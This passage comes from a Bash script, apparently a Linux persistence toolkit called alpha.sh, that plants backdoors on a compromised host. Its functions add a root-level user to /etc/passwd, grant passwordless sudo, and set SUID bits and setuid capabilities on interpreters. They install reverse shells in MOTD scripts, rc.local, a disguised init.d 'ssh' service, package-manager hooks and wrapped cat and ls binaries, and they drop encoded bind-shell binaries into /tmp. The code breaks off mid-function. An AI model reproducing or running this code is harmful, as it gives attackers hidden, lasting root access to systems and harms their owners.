			--password )
				shift
				password=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./alpha.sh --password-change --username <username> --password <password>"
				exit 0
				;;
			--help|-h)
				usage_password_change
				exit 0
				;;
			* )
				echo "Invalid option for --password-change: $1"
				echo "Try './alpha.sh --password-change --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username || -z $password ]]; then
		echo "Error: --username and --password must be specified."
		echo "Try './alpha.sh --password-change --help' for more information."
		exit 1
	fi

	echo "$username:$password" | chpasswd

	if [[ $? -eq 0 ]]; then
		echo "[+] Password for user $username has been changed."
	else
		echo "[-] Failed to change password for user $username."
		exit 1
	fi
}

setup_passwd_user() {
	local default=0
	local custom=0
	local username=""
	local password=""
	local passwd_string=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_passwd_user() {
		echo "Usage: ./alpha.sh --passwd-user [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default settings"
		echo "  --username <username>        Specify the username"
		echo "  --password <password>        Specify the password"
		echo "--custom                     Use custom string"
		echo "  --passwd-string <string>     Specify the /etc/passwd string"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--passwd-string )
				shift
				passwd_string=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./alpha.sh --passwd-user --default --username <username> --password <password>"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --passwd-user --custom --passwd-string <openssl generated passwd string>"
				exit 0
				;;
			--help|-h)
				usage_passwd_user
				exit 0
				;;
		
			* )
				echo "Invalid option for --passwd-user: $1"
				echo "Try './alpha.sh --passwd-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --passwd-user --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $username || -z $password ]]; then
			echo "Error: --username and --password must be specified with --default."
			echo "Try './alpha.sh --passwd-user --help' for more information."
			exit 1
		fi

		if ! command -v openssl &> /dev/null; then
			echo "Error: openssl is not installed on this system. Use --custom with --passwd-string instead."
			exit 1
		fi

		openssl_password=$(openssl passwd "$password")
		if [[ $? -eq 0 ]]; then
			echo "$username:$openssl_password:0:0:root:/root:/bin/bash" >> /etc/passwd
			echo "[+] User $username added to /etc/passwd with root privileges."
		else
			echo "[-] Failed to generate password hash with openssl."
			exit 1
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $passwd_string ]]; then
			echo "Error: --passwd-string must be specified with --custom."
			echo "Try './alpha.sh --passwd-user --help' for more information."
			exit 1
		fi

		echo "$passwd_string" >> /etc/passwd
		echo "[+] Custom passwd string added to /etc/passwd."
	else
		echo "Error: Either --default or --custom must be specified for --passwd-user."
		echo "Try './alpha.sh --passwd-user --help' for more information."
		exit 1
	fi
	echo "[+] /etc/passwd persistence established!"
}

setup_sudoers_backdoor() {
	local username=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_sudoers_backdoor() {
		echo "Usage: ./alpha.sh --sudoers-backdoor [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./alpha.sh --sudoers --username <username>"
				exit 0
				;;
			--help|-h)
				usage_sudoers_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --sudoers-backdoor: $1"
				echo "Try './alpha.sh --sudoers-backdoor --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		echo "Try './alpha.sh --sudoers-backdoor --help' for more information."
		exit 1
	fi

	echo "$username ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username can now run all commands without a sudo password."
	else
		echo "[-] Failed to create sudoers backdoor for user $username."
		exit 1
	fi
	echo "[+] Sudoers backdoor persistence established!"
}

setup_suid_backdoor() {
	local default=0
	local custom=0
	local binary=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_suid_backdoor() {
		echo "Usage: ./alpha.sh --suid [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default SUID settings"
		echo "--custom                     Use custom SUID settings"
		echo "  --binary <binary>            Specify the binary to give SUID permissions"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./alpha.sh --suid --default"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --suid --custom --binary \"/bin/find\""
				exit 0
				;;
			--help|-h)
				usage_suid_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --suid: $1"
				echo "Try './alpha.sh --suid --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --suid --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './alpha.sh --suid --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		local binaries=("find" "dash" "python" "python3")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				# Resolve symbolic links to get the real path
				path=$(realpath $path)
				chmod u+s $path
				if [[ $? -eq 0 ]]; then
					echo "[+] SUID privilege granted to $path"
				else
					echo "[-] Failed to grant SUID privilege to $path"
				fi
			else
				echo "[-] $bin is not present on the system."
			fi
		done
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified with --custom."
			echo "Try './alpha.sh --suid --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			# Resolve symbolic links to get the real path
			path=$(realpath $path)
			chmod u+s $path
			if [[ $? -eq 0 ]]; then
				echo "[+] SUID privilege granted to $path"
			else
				echo "[-] Failed to grant SUID privilege to $path"
			fi
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
	echo "[+] SUID backdoor persistence established!"
}

setup_motd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_motd_backdoor() {
		echo "Usage: ./alpha.sh --motd [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default MOTD settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom MOTD settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom MOTD file path in /etc/update-motd.d/"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./alpha.sh --motd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --motd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' & disown\" --path \"/etc/update-motd.d/137-python-upgrades\""
				exit 0
				;;
			--help|-h)
				usage_motd_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --motd-backdoor: $1"
				echo "Try './alpha.sh --motd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --motd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './alpha.sh --motd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './alpha.sh --motd --help' for more information."
			exit 1
		fi
		mkdir -p /etc/update-motd.d
		path="/etc/update-motd.d/137-python-upgrades"
		echo -e "#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' & disown" > $path
		chmod +x $path
		echo "[+] MOTD backdoor established in $path"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './alpha.sh --motd --help' for more information."
			exit 1
		fi

		if [[ ! -f $path ]]; then
			mkdir -p /etc/update-motd.d
			echo -e "#!/bin/sh\n$command" > $path
			chmod +x $path
		else
			# Read the first line and the rest of the file separately
			first_line=$(head -n 1 $path)
			rest_of_file=$(tail -n +2 $path)
			echo -e "#!/bin/sh\n$command\n${rest_of_file}" > $path
		fi
		echo "[+] MOTD backdoor persistence established!"
	fi
}

setup_rc_local_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local rc_local_path="/etc/rc.local"

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_rc_local_backdoor() {
		echo "Usage: ./alpha.sh --rc-local [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default rc.local settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom rc.local settings"
		echo "  --command <command>          Specify custom command"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./alpha.sh --rc-local --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --rc-local --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\""
				exit 0
				;;
			--help|-h)
				usage_rc_local_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --rc-local-backdoor: $1"
				echo "Try './alpha.sh --rc-local --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --rc-local --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './alpha.sh --rc-local --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './alpha.sh --rc-local --help' for more information."
			exit 1
		fi

		if [[ ! -f $rc_local_path ]]; then
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $rc_local_path
			chmod +x $rc_local_path
			echo "[+] rc.local backdoor established"
		else
			echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" >> $rc_local_path
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command ]]; then
			echo "Error: --command must be specified when using --custom."
			echo "Try './alpha.sh --rc-local --help' for more information."
			exit 1
		fi

		if [[ ! -f $rc_local_path ]]; then
			echo -e "#!/bin/sh\n$command" > $rc_local_path
			chmod +x $rc_local_path
		else
			echo "$command" >> $rc_local_path
		fi
	fi
	
	if [ -f /etc/rc.d/rc.local ]; then
		chmod +x /etc/rc.d/rc.local
	fi
	echo "[+] rc.local backdoor persistence established!"
}

setup_initd_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local initd_path="/etc/init.d/ssh-procps"

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_initd_backdoor() {
		echo "Usage: ./alpha.sh --initd-backdoor [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default init.d settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom init.d settings"
		echo "  --command <command>          Specify custom command"
		echo "  --path <path>                Specify custom /etc/init.d/ file path"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--path )
				shift
				initd_path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./alpha.sh --initd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --initd --custom --command \"nohup setsid bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/etc/init.d/initd-backdoor\""
				exit 0
				;;
			--help|-h)
				usage_initd_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --initd: $1"
				echo "Try './alpha.sh --initd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --initd --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './alpha.sh --initd --help' for more information."
		exit 1
	fi

	create_initd_script() {
		local payload=$1
		mkdir -p /etc/init.d
		cat <<-EOF > $initd_path
		#! /bin/sh
		### BEGIN INIT INFO
		# Provides:             ssh sshd
		# Required-Start:       \$remote_fs \$syslog \$network
		# Required-Stop:        \$remote_fs \$syslog
		# Default-Start:        2 3 4 5
		# Default-Stop:        
		# Short-Description:    OpenBSD Secure Shell server
		### END INIT INFO

		$payload
		EOF
		chmod +x $initd_path
	}

	establish_persistence() {
		if sudo which update-rc.d >/dev/null 2>&1; then
			sudo update-rc.d $(basename $initd_path) defaults
		elif sudo which chkconfig >/dev/null 2>&1; then
			sudo chkconfig --add $(basename $initd_path)
			sudo chkconfig $(basename $initd_path) on
		elif sudo which systemctl >/dev/null 2>&1; then
			# Create systemd service
			local service_name=$(basename $initd_path)
			local service_path="/etc/systemd/system/${service_name}.service"
			cat <<-EOF > $service_path
			[Unit]
			Description=Custom Init Script
			After=network.target

			[Service]
			Type=simple
			ExecStart=$initd_path start
			ExecStop=$initd_path stop
			ExecReload=$initd_path reload
			Restart=always
			RestartSec=5
			TimeoutStopSec=30
			TimeoutStartSec=30

			[Install]
			WantedBy=multi-user.target
			EOF
			sudo systemctl daemon-reload
			sudo systemctl enable $service_name
			sudo systemctl start $service_name &
		elif sudo which service >/dev/null 2>&1; then
			# Using service to start the script directly
			sudo service $(basename $initd_path) start
		else
			echo "Error: No suitable method found to establish persistence."
			exit 1
		fi
	}

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './alpha.sh --initd --help' for more information."
			exit 1
		fi

		local payload="nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
		if [[ ! -f $initd_path ]]; then
			create_initd_script "$payload"
		else
			echo "$payload" >> $initd_path
		fi
		establish_persistence
		echo "[+] init.d backdoor established!"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $initd_path ]]; then
			echo "Error: --command and --path must be specified when using --custom."
			echo "Try './alpha.sh --initd --help' for more information."
			exit 1
		fi

		if [[ ! -f $initd_path ]]; then
			create_initd_script "$command"
		else
			echo "$command" >> $initd_path
		fi
		establish_persistence
		echo "[+] init.d backdoor established"
	fi
}

setup_package_manager_persistence() {
	local ip=""
	local port=""
	local mechanism=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_package_manager_persistence() {
		echo "Usage: ./alpha.sh --package-manager [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
		echo "--apt | --yum | --dnf        Use APT, YUM or DNF package manager"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--apt | --dnf | --yum )
				mechanism="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./alpha.sh --package-manager --ip 10.10.10.10 --port 1337 --apt | --yum | --dnf"
				exit 0
				;;
			--help|-h)
				usage_package_manager_persistence
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './alpha.sh --package-manager --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port || -z $mechanism ]]; then
		echo "Error: --ip, --port, and one of --apt, --yum, or --dnf must be specified."
		echo "Try './alpha.sh --package-manager --help' for more information."
		exit 1
	fi
	# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
	local python_script=$(echo -e "#!/usr/bin/env python\nHOST = \"$ip\"\nPORT = $port\n\ndef connect(host_port):\n\timport socket\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect(host_port)\n\treturn s\n\ndef wait_for_command(s):\n\timport subprocess\n\tdata = s.recv(1024)\n\tif data == \"quit\":\n\n\t\ts.close()\n\t\tsys.exit(0)\n\telif len(data) == 0:\n\t\treturn True\n\telse:\n\t\tproc = subprocess.Popen(data, shell=True,\n\t\tstdout=subprocess.PIPE, stderr=subprocess.PIPE,\n\t\tstdin=subprocess.PIPE)\n\t\tstdout_value = proc.stdout.read() + proc.stderr.read()\n\t\ts.send(stdout_value)\n\t\treturn False\n\ndef main():\n\timport sys, os, socket, time\n\twhile True:\n\t\tsocket_died = False\n\t\ttry:\n\t\t\ts = connect((HOST, PORT))\n\t\t\twhile not socket_died:\n\t\t\t\tsocket_died = wait_for_command(s)\n\t\t\ts.close()\n\t\texcept socket.error:\n\t\t\tpass\n\t\ttime.sleep(5)\n\nif __name__ == \"__main__\":\n\tmain()")

	case $mechanism in
		--apt )
			if [[ ! -x "$(command -v apt)" ]]; then
				echo "APT is not installed. Please install APT to use this option."
				echo "Try './alpha.sh --package-manager --help' for more information."
				exit 1
			fi

			path="/etc/apt/apt.conf.d/01python-upgrades"
			echo -e "APT::Update::Pre-Invoke {\"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &\"};" > $path
			echo "[+] APT persistence established"
			;;

		--yum )
			if [[ ! -x "$(command -v yum)" ]]; then
				echo "Yum is not installed. Please install Yum to use this option."
				echo "Try './alpha.sh --package-manager --help' for more information."
				exit 1
			fi

			if [[ -x "$(command -v dnf)" && "$(readlink -f "$(which yum)")" == "$(which dnf)" ]]; then
				echo "Yum is symlinked to DNF. Please use --dnf option."
				echo "Try './alpha.sh --package-manager --help' for more information."
				exit 1
			fi

			echo "$python_script" > /usr/lib/yumcon
			chmod +x /usr/lib/yumcon

			echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
			
			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
			echo -e "import os\n\ntry:\n\tfrom yum.plugins import TYPE_INTERACTIVE, PluginYumExit\n\trequires_api_version = '2.0'\n\tplugin_type = TYPE_INTERACTIVE\nexcept ImportError:\n\trequires_api_version = '1.0'\n\ndef pretrans_hook(conduit):\n\tos.system('setsid /usr/lib/yumcon 2>/dev/null & ')" > /usr/lib/yum-plugins/yumcon.py

			echo "[+] Yum persistence established"
			;;

		--dnf )
			if [[ ! -x "$(command -v dnf)" ]]; then
				echo "DNF is not installed. Please install DNF to use this option."
				echo "Try './alpha.sh --package-manager --help' for more information."
				exit 1
			fi

			python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
			python_path=$(which python)

			echo "$python_script" > /usr/lib/$python_version/site-packages/dnfcon
			chmod +x /usr/lib/$python_version/site-packages/dnfcon

			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
			echo -e "import dnf\nimport os\n\ndef execute_dnfcon():\n\tos.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')\n\nclass BackdoorPlugin(dnf.Plugin):\n\tname = 'dnfcon'\n\n\tdef __init__(self, base, cli):\n\t\tsuper(BackdoorPlugin, self).__init__(base, cli)\n\t\texecute_dnfcon()\n\n\tdef __init__(self, base, conf, **kwargs):\n\t\tdnf.Plugin.__init__(self, base, conf, **kwargs)\n\t\texecute_dnfcon()\n\nplugin = BackdoorPlugin" > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
			chmod +x /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
			
			echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf

			echo "[+] DNF persistence established"
			;;
	esac
	echo "[+] Package manager persistence established!"
}

setup_cap_backdoor() {
	local default=0
	local custom=0
	local capability=""
	local binary=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_cap_backdoor() {
		echo "Usage: ./alpha.sh --cap [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default capabilities settings"
		echo "--custom                     Use custom capabilities settings"
		echo "  --capability <capability>   Specify the capability"
		echo "  --binary <binary>           Specify the path to the binary"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--capability )
				shift
				capability=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./alpha.sh --cap --default"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --cap --custom --capability \"cap_setuid+ep\" --binary \"/bin/find\""
				exit 0
				;;
			--help|-h)
				usage_cap_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --cap: $1"
				echo "Try './alpha.sh --cap --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --cap --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './alpha.sh --cap --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		local binaries=("perl" "ruby" "php" "python" "python3" "node")
		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				# Resolve symbolic links to get the real path
				path=$(realpath $path)
				setcap cap_setuid+ep $path
				if [[ $? -eq 0 ]]; then
					echo "[+] Capability setuid granted to $path"
				else
					echo "[-] Failed to grant capability setuid to $path"
				fi
			else
				echo "[-] $bin is not present on the system."
			fi
		done
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $capability || -z $binary ]]; then
			echo "Error: --capability and --binary must be specified with --custom."
			echo "Try './alpha.sh --cap --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			# Resolve symbolic links to get the real path
			path=$(realpath $path)
			setcap $capability $path
			if [[ $? -eq 0 ]]; then
				echo "[+] Capability $capability granted to $path"
			else
				echo "[-] Failed to grant capability $capability to $path"
			fi
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
	echo "[+] Capabilities backdoor persistence established!"
}

setup_bind_shell() {
	local default=0
	local custom=0
	local architecture=""
	local binary=""

	usage_bind_shell() {
		echo "Usage: ./alpha.sh --bind-shell [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default bind shell settings"
		echo "  --architecture <arch>        Specify architecture (x86 or x64)"
		echo "--custom                     Use custom bind shell binary"
		echo "  --binary <binary>            Specify the path to the custom binary"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--architecture )
				shift
				architecture=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./alpha.sh --bind-shell --default --architecture x86"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --bind-shell --custom --binary \"/tmp/bindshell\""
				exit 0
				;;
			--help|-h)
				usage_bind_shell
				exit 0
				;;
			* )
				echo "Invalid option for --bind-shell: $1"
				echo "Try './alpha.sh --bind-shell --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --bind-shell --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $architecture ]]; then
			echo "Error: --architecture (x64/x86) must be specified when using --default."
			echo "Try './alpha.sh --bind-shell --help' for more information."
			exit 1
		fi

		case $architecture in
			x86 )
				echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
				chmod +x /tmp/bd86
				/tmp/bd86 &
				echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
				;;
			x64 )
				echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
				chmod +x /tmp/bd64
				/tmp/bd64 &
				echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
				;;
			* )
				echo "Error: Invalid architecture specified. Use one of x86 or x64"
				echo "Try './alpha.sh --bind-shell --help' for more information."
				exit 1
		esac

		echo "[+] The bind shell is listening on port 9001."
		echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified when using --custom."
			echo "Try './alpha.sh --bind-shell --help' for more information."
			exit 1
		fi

		if [[ ! -f $binary ]]; then
			echo "Error: Specified binary does not exist: $binary"
			echo "Try './alpha.sh --bind-shell --help' for more information."
			exit 1
		fi

		chmod +x $binary
		$binary &
		echo "[+] Custom binary $binary is executed and running in the background."

	else
		echo "Error: Either --default or --custom must be specified for --bind-shell."
		echo "Try './alpha.sh --bind-shell --help' for more information."
		exit 1
	fi
	echo "[+] Bind shell persistence established!"
}

setup_system_binary_backdoor() {
	local default=0
	local custom=0
	local warning=0
	local ip=""
	local port=""
	local binary=""
	local command=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_system_binary_backdoor() {
		echo "Usage: ./alpha.sh --system-binary [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default system binary backdoor settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom system binary backdoor settings"
		echo "  --binary <binary>            Specify the binary to backdoor"
		echo "  --command <command>          Specify the custom command to execute"
		echo "  --warning                    This may interrupt your system.. Be careful!"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--warning )
				warning=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./alpha.sh --system-binary --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./alpha.sh --system-binary --custom --binary \"/bin/cat\" --command \"/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337'\" --warning"
				exit 0
				;;
			--help|-h)
				usage_system_binary_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --system-binary-backdoor: $1"
				echo "Try './alpha.sh --system-binary --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './alpha.sh --system-binary --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './alpha.sh --system-binary --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './alpha.sh --system-binary --help' for more information."
			exit 1
		fi

		local binaries=("cat" "ls")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				mv $path $path.original
				echo -e '#!/bin/bash\n/bin/bash -c "bash -i >& /dev/tcp/'$ip'/'$port' 0>&1 2>/dev/null &"\n'$path'.original "$@"' > $path
				chmod +x $path
				echo "[+] $bin backdoored successfully."
			else
				echo "[-] $bin is not present on the system."
			fi
		done

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary || -z $command ]]; then
			echo "Error: --binary and --command must be specified when using --custom."
			echo "Try './alpha.sh --system-binary --help' for more information."
			exit 1
		fi

